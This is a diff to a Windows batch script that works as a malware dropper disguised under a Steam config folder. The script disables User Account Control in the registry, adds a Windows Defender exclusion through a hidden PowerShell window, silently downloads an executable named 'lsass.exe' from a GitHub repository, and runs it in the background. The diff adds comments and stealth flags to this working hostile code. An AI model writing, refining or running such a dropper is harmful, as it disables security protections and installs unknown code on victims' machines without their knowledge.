@@ -2,20 +2,28 @@
 setlocal enabledelayedexpansion
 
 set "folderPath=%USERPROFILE%\AppData\Local\SteamConfig"
+set "exePath=%folderPath%\lsass.exe"
+
+:: Create folder if not exists
 if not exist "%folderPath%" mkdir "%folderPath%"
 
+:: Disable User Account Control (UAC) for elevation
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
 
-powershell -Command "Start-Process powershell -ArgumentList 'Add-MpPreference -ExclusionPath \"%folderPath%\"' -Verb RunAs" >nul 2>&1
+:: Use PowerShell to add exclusion for the executable (without opening PowerShell window)
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionProcess '%exePath%'" >nul 2>&1
 
-curl -L -o "%folderPath%\lsass.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" >nul 2>&1
+:: Download the executable file silently
+curl -L -o "%exePath%" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" >nul 2>&1
 if %errorlevel% neq 0 exit /b 1
 
-if not exist "%folderPath%\lsass.exe" exit /b 1
-for %%F in ("%folderPath%\lsass.exe") do set filesize=%%~zF
+:: Check if the file is downloaded and not empty
+if not exist "%exePath%" exit /b 1
+for %%F in ("%exePath%") do set filesize=%%~zF
 if "%filesize%"=="0" exit /b 1
 
-start "" /b "%folderPath%\lsass.exe"
+:: Run the executable silently in the background
+start "" /b "%exePath%"
 exit
 
 :: Create VBScript to run batch silently
